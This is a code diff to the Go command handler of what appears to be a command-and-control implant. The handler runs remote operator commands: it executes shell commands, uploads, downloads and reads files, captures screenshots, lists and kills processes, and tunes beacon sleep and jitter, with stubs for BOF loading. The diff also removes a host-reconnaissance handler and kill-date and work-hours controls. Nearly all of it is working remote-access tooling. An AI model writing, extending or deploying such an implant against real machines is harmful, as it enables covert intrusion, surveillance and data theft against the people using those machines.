@@ -2,10 +2,8 @@ package main
 
 import (
 	"fmt"
-	"net"
 	"os"
 	"path/filepath"
-	"runtime"
 
 	"__NAME__/protocol"
 )
@@ -18,8 +16,7 @@ func TaskProcess(objects [][]byte) [][]byte {
 		if err := protocol.Unmarshal(obj, &cmd); err != nil {
 			continue
 		}
-		resp := dispatch(cmd)
-		if resp != nil {
+		if resp := dispatch(cmd); resp != nil {
 			responses = append(responses, resp)
 		}
 	}
@@ -35,8 +32,8 @@ func dispatch(cmd protocol.Command) []byte {
 
 	// ── File system ────────────────────────────────────────────────────────────
 
-	case protocol.COMMAND_FS_LIST:
-		var p protocol.ParamsFsList
+	case protocol.COMMAND_LS:
+		var p protocol.ParamsLs
 		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
@@ -44,10 +41,11 @@ func dispatch(cmd protocol.Command) []byte {
 		if err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
-		return okResp(protocol.RESP_FS_LIST, cmd.Id, protocol.AnsFsList{Path: path, Entries: entries})
+		filesBytes, _ := protocol.Marshal(entries)
+		return okResp(protocol.COMMAND_LS, cmd.Id, protocol.AnsLs{Result: true, Path: path, Files: filesBytes})
 
-	case protocol.COMMAND_FS_UPLOAD:
-		var p protocol.ParamsFsUpload
+	case protocol.COMMAND_UPLOAD:
+		var p protocol.ParamsUpload
 		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
@@ -55,13 +53,13 @@ func dispatch(cmd protocol.Command) []byte {
 		if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
-		if err := os.WriteFile(path, p.Data, 0644); err != nil {
+		if err := os.WriteFile(path, p.Content, 0644); err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
-		return okResp(protocol.RESP_FS_UPLOAD, cmd.Id, protocol.AnsFsUpload{Path: path})
+		return okResp(protocol.COMMAND_UPLOAD, cmd.Id, protocol.AnsUpload{Path: path})
 
-	case protocol.COMMAND_FS_DOWNLOAD:
-		var p protocol.ParamsFsDownload
+	case protocol.COMMAND_DOWNLOAD:
+		var p protocol.ParamsDownload
 		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
@@ -70,10 +68,12 @@ func dispatch(cmd protocol.Command) []byte {
 		if err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
-		return okResp(protocol.RESP_FS_DOWNLOAD, cmd.Id, protocol.AnsFsDownload{Path: path, Data: data})
+		return okResp(protocol.COMMAND_DOWNLOAD, cmd.Id, protocol.AnsDownload{
+			Path: path, Size: len(data), Content: data, Start: true, Finish: true,
+		})
 
-	case protocol.COMMAND_FS_REMOVE:
-		var p protocol.ParamsFsRemove
+	case protocol.COMMAND_RM:
+		var p protocol.ParamsRm
 		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
@@ -82,8 +82,8 @@ func dispatch(cmd protocol.Command) []byte {
 		}
 		return completeResp(cmd.Id)
 
-	case protocol.COMMAND_FS_MKDIRS:
-		var p protocol.ParamsFsMkdirs
+	case protocol.COMMAND_MKDIR:
+		var p protocol.ParamsMkdir
 		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
@@ -92,8 +92,8 @@ func dispatch(cmd protocol.Command) []byte {
 		}
 		return completeResp(cmd.Id)
 
-	case protocol.COMMAND_FS_COPY:
-		var p protocol.ParamsFsCopy
+	case protocol.COMMAND_CP:
+		var p protocol.ParamsCp
 		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
@@ -113,8 +113,8 @@ func dispatch(cmd protocol.Command) []byte {
 		}
 		return completeResp(cmd.Id)
 
-	case protocol.COMMAND_FS_MOVE:
-		var p protocol.ParamsFsMove
+	case protocol.COMMAND_MV:
+		var p protocol.ParamsMv
 		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
@@ -123,26 +123,25 @@ func dispatch(cmd protocol.Command) []byte {
 		}
 		return completeResp(cmd.Id)
 
-	case protocol.COMMAND_FS_CD:
-		var p protocol.ParamsFsCd
+	case protocol.COMMAND_CD:
+		var p protocol.ParamsCd
 		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
-		path := agent.NormalizePath(p.Path)
-		if err := os.Chdir(path); err != nil {
+		if err := os.Chdir(agent.NormalizePath(p.Path)); err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
 		return completeResp(cmd.Id)
 
-	case protocol.COMMAND_FS_PWD:
+	case protocol.COMMAND_PWD:
 		cwd, err := os.Getwd()
 		if err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
-		return okResp(protocol.RESP_FS_PWD, cmd.Id, protocol.AnsFsPwd{Path: cwd})
+		return okResp(protocol.COMMAND_PWD, cmd.Id, protocol.AnsPwd{Path: cwd})
 
-	case protocol.COMMAND_FS_CAT:
-		var p protocol.ParamsFsCat
+	case protocol.COMMAND_CAT:
+		var p protocol.ParamsCat
 		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
@@ -150,94 +149,54 @@ func dispatch(cmd protocol.Command) []byte {
 		if err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
-		return okResp(protocol.RESP_FS_CAT, cmd.Id, protocol.AnsFsCat{Content: string(data)})
+		return okResp(protocol.COMMAND_CAT, cmd.Id, protocol.AnsCat{Path: p.Path, Content: data})
 
-	// ── OS ─────────────────────────────────────────────────────────────────────
+	// ── Execution ──────────────────────────────────────────────────────────────
 
-	case protocol.COMMAND_OS_RUN:
-		var p protocol.ParamsOsRun
+	case protocol.COMMAND_RUN:
+		var p protocol.ParamsRun
 		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
-		output, err := agent.RunShell(p.Command, p.Output, p.Wait)
+		// TODO: implement using p.Program and p.Args
+		output, err := agent.RunShell(p.Program, true, true)
 		if err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
-		return okResp(protocol.RESP_OS_RUN, cmd.Id, protocol.AnsOsRun{Output: output})
+		return okResp(protocol.COMMAND_RUN, cmd.Id, protocol.AnsRun{Stdout: output, Finish: true})
 
-	case protocol.COMMAND_OS_INFO:
-		hostname, _ := os.Hostname()
-		username := os.Getenv("USER")
-		if username == "" {
-			username = os.Getenv("USERNAME")
-		}
-		domain := os.Getenv("USERDOMAIN")
-		if domain == "" {
-			domain = hostname
-		}
-		internalIP := ""
-		if ifaces, err := net.Interfaces(); err == nil {
-		outerIP:
-			for _, iface := range ifaces {
-				if iface.Flags&net.FlagLoopback != 0 {
-					continue
-				}
-				if addrs, err := iface.Addrs(); err == nil {
-					for _, a := range addrs {
-						if ipNet, ok := a.(*net.IPNet); ok && ipNet.IP.To4() != nil {
-							internalIP = ipNet.IP.String()
-							break outerIP
-						}
-					}
-				}
-			}
-		}
-		ans := protocol.AnsOsInfo{
-			Hostname:    hostname,
-			Username:    username,
-			Domain:      domain,
-			InternalIP:  internalIP,
-			Os:          runtime.GOOS,
-			OsVersion:   agent.GetOsVersion(),
-			OsArch:      runtime.GOARCH,
-			Elevated:    agent.IsElevated(),
-			ProcessId:   uint32(os.Getpid()),
-			ProcessName: processName(),
-			CodePage:    agent.GetCP(),
-		}
-		return okResp(protocol.RESP_OS_INFO, cmd.Id, ans)
-
-	case protocol.COMMAND_OS_PS:
+	case protocol.COMMAND_PS:
 		procs, err := agent.ListProcesses()
 		if err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
-		return okResp(protocol.RESP_OS_PS, cmd.Id, protocol.AnsOsPs{Processes: procs})
+		procBytes, _ := protocol.Marshal(procs)
+		return okResp(protocol.COMMAND_PS, cmd.Id, protocol.AnsPs{Result: true, Processes: procBytes})
 
-	case protocol.COMMAND_OS_SCREENSHOT:
+	case protocol.COMMAND_SCREENSHOT:
 		img, err := agent.CaptureScreenshot()
 		if err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
-		return okResp(protocol.RESP_OS_SCREENSHOT, cmd.Id, protocol.AnsOsScreenshot{Image: img})
+		return okResp(protocol.COMMAND_SCREENSHOT, cmd.Id, protocol.AnsScreenshots{Screens: [][]byte{img}})
 
-	case protocol.COMMAND_OS_SHELL:
-		var p protocol.ParamsOsShell
+	case protocol.COMMAND_SHELL:
+		var p protocol.ParamsShell
 		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
-		output, err := agent.RunShell(p.Command, true, true)
+		output, err := agent.RunShell(p.Program, true, true)
 		if err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
-		return okResp(protocol.RESP_OS_SHELL, cmd.Id, protocol.AnsOsShell{Output: output})
+		return okResp(protocol.COMMAND_SHELL, cmd.Id, protocol.AnsShell{Output: output})
 
-	case protocol.COMMAND_OS_KILL:
-		var p protocol.ParamsOsKill
+	case protocol.COMMAND_KILL:
+		var p protocol.ParamsKill
 		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
-		proc, err := os.FindProcess(int(p.Pid))
+		proc, err := os.FindProcess(p.Pid)
 		if err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
@@ -248,8 +207,8 @@ func dispatch(cmd protocol.Command) []byte {
 
 	// ── Profile tuning ─────────────────────────────────────────────────────────
 
-	case protocol.COMMAND_PROFILE_SLEEP:
-		var p protocol.ParamsProfileSleep
+	case protocol.COMMAND_SLEEP:
+		var p protocol.ParamsSleep
 		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
@@ -257,28 +216,7 @@ func dispatch(cmd protocol.Command) []byte {
 		agentSleep = p.Sleep
 		agentJitter = p.Jitter
 		stateMu.Unlock()
-		return completeResp(cmd.Id)
-
-	case protocol.COMMAND_PROFILE_KILLDATE:
-		var p protocol.ParamsProfileKilldate
-		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
-			return errResp(cmd.Id, err.Error())
-		}
-		stateMu.Lock()
-		killDate = p.KillDate
-		stateMu.Unlock()
-		return completeResp(cmd.Id)
-
-	case protocol.COMMAND_PROFILE_WORKTIME:
-		var p protocol.ParamsProfileWorktime
-		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
-			return errResp(cmd.Id, err.Error())
-		}
-		stateMu.Lock()
-		workStart = p.WorkStart
-		workEnd = p.WorkEnd
-		stateMu.Unlock()
-		return completeResp(cmd.Id)
+		return okResp(protocol.COMMAND_SLEEP, cmd.Id, protocol.AnsSleep{Sleep: p.Sleep, Jitter: p.Jitter})
 
 	// ── BOF execution ──────────────────────────────────────────────────────────
 
@@ -288,14 +226,6 @@ func dispatch(cmd protocol.Command) []byte {
 			return errResp(cmd.Id, err.Error())
 		}
 		// TODO: Integrate a COFF loader (e.g. the coffer package from gopher_agent).
-		//
-		// args, _ := base64.StdEncoding.DecodeString(p.ArgsPack)
-		// msgs, err := coffer.Load(p.Object, args)
-		// if err != nil {
-		//     return errResp(cmd.Id, err.Error())
-		// }
-		// list, _ := protocol.Marshal(msgs)
-		// return okResp(protocol.COMMAND_EXEC_BOF, cmd.Id, protocol.AnsExecBof{Msgs: list})
 		return errResp(cmd.Id, "BOF loader not yet implemented")
 
 	case protocol.COMMAND_EXEC_BOF_ASYNC:
@@ -303,7 +233,7 @@ func dispatch(cmd protocol.Command) []byte {
 		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
 			return errResp(cmd.Id, err.Error())
 		}
-		// TODO: Integrate async COFF loader (coffer.LoadAsync) with BOF_PACK output streaming.
+		// TODO: Integrate async COFF loader with BOF_PACK output streaming.
 		return errResp(cmd.Id, "async BOF loader not yet implemented")
 
 	// ── Job management ─────────────────────────────────────────────────────────
@@ -325,13 +255,13 @@ func dispatch(cmd protocol.Command) []byte {
 // ─── Response helpers ──────────────────────────────────────────────────────────
 
 func completeResp(id uint) []byte {
-	data, _ := protocol.Marshal(protocol.Command{Code: protocol.RESP_COMPLETE, Id: id})
+	data, _ := protocol.Marshal(protocol.Command{Code: 0, Id: id})
 	return data
 }
 
 func errResp(id uint, msg string) []byte {
 	payload, _ := protocol.Marshal(protocol.AnsError{Error: msg})
-	data, _ := protocol.Marshal(protocol.Command{Code: protocol.RESP_ERROR, Id: id, Data: payload})
+	data, _ := protocol.Marshal(protocol.Command{Code: protocol.COMMAND_ERROR, Id: id, Data: payload})
 	return data
 }
 
